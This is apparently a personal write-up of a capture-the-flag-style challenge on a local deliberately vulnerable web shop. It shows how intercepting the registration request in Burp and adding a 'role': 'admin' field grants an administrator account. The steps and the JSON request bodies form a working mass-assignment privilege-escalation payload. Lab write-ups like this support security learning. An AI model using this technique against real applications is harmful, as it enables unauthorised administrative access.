- Go to http://localhost:3000/#/register
- Enter all information
- Use burp to intercept the request when clicking submit
- See
```
{"email":"admin@email.com","password":"I@m@dmin123","passwordRepeat":"I@m@dmin123","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2026-07-07T14:02:24.077Z","updatedAt":"2026-07-07T14:02:24.077Z"},"securityAnswer":"a"}
```
- It seems there is no useful field I can exploit to forge a request (I was hoping for a field like `"admin": false`)
- Maybe I have to explicitly add that field
- Remember I have the `Users` table schema from [[password-strength]]
- I see that there is a `role` field defaulting to `customer`, which is why I don't see it appears when intercept the registering with burp
- Go to http://localhost:3000/#/register
- Enter all information again
- Use burp to intercept the request when clicking submit
- Add `"role": "admin"`
```
{"email":"admin@email.com","password":"I@m@dmin123","passwordRepeat":"I@m@dmin123",
"role": "admin",
"securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2026-07-07T14:02:24.077Z","updatedAt":"2026-07-07T14:02:24.077Z"},"securityAnswer":"a"}
```
- Complete the challenge